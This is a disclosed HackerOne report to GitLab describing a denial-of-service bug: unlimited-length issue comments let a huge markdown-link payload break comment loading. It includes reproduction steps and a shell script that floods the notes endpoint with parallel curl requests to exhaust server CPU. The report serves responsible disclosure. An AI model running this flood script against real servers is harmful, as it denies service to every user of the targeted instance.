# DoS attack via comment on Issue

## Report Details
- **Report ID**: 557154
- **URL**: https://hackerone.com/reports/557154
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-04-30T17:59:37.266Z
- **Disclosed**: 2019-11-21T14:27:05.916Z

## Reporter
- **Username**: 8ayac
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
There is no limit to the number of characters in the issue comments, which allows a DoS attack. The DoS attack affects both server-side and client-side.

**NOTE**: This bug happens on GitLab.com.

### Steps to reproduce
▼Attack for Client-side 
1. Sign in to GitLab.
2. Create a project as below:
    - Project name: test01
    - Project slug: test01
    - Visibility Level: Public
    - Initialize repository with README: Checked
3. Create a new issue for the project created in Step 2.
4. Post some comments on the Issue created in Step 3.
5. Post a comment as below:
`[a](/a/a/a/a/a/a/a/a/a/a/a/a/a/a.....(50000 times))`
6. Reload the Issue page.

Result: I received an error message "Something went wrong while fetching comments. Please try again." And I could not fetch all the comments.

Note: In Step 5, if you can not post the comment from the browser, send the HTTP request directly in some way.
Note: The string to post in step 5 is described in the attached file F481358.

- PoC movie: F481363

▼Attack for Server-side
An attacker can exhaust server resources by continuously sending the requests generated in Step 5 of [Attack for Client-side]. This causes a denial of service to all users.

For example, you can verify it with a script as below:
```sh
#!/bin/sh
charBlock=$(head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g')
payload='[a]('$charBlock')'

gitlabHost=$1
ProjectURL=$2
targetID=$3
loop=$4

curl=`cat << EOS
curl
  --insecure
  --silent
  --output /dev/null
  ${ProjectURL}/notes?target_id=${targetID}\&target_type=issue
  --header 'Host: ${gitlabHost}'
  --header 'X-CSRF-Token: [PLACEHOLDER]'
  -b '_gitlab_session=[PLACEHOLDER]'
  --data-binary 'note%5Bnoteable_type%5D=Issue&note%5Bnoteable_id%5D=3&note%5Bnote%5D=${payload}&merge_request_diff_head_sha=undefined'
EOS`

for i in `seq ${loop}`
do
    eval ${curl}&
done
```

Run the above script with the following command to see that the server's CPU is exhausted.
```
$ ./poc.sh [GitLab host] [Project URL] [target ID(※1)] [Repeat count of request]
```
※1: Get from the request generated in step 5 of [Client-side attack].

- PoC movie:  F481365 


#### Results of GitLab environment info
```
System information
System:
Current User:   git
Using RVM:      no
Ruby Version:   2.5.3p105
Gem Version:    2.7.6
Bundler Version:1.17.3
Rake Version:   12.3.2
Redis Version:  3.2.12
Git Version:    2.18.1
Sidekiq Version:5.2.5
Go Version:     unknown

GitLab information
Version:        11.10.2
Revision:       f3e84e78b62
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     9.6.11
URL:            https://gitlab.example.com
HTTP Clone URL: https://gitlab.example.com/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.com:some-group/some-project.git
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        9.0.0
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## Impact

### Impact for client-side 
All comments on Issue will be inaccessible.

### Impact for server-side:
The CPU is exhausted and users will be able to access the GitLab service.

NOTE: All users who can comment on the issue can exploit this vulnerability.

## Attachments
- payload.txt
- poc1.mp4
- poc2.mp4
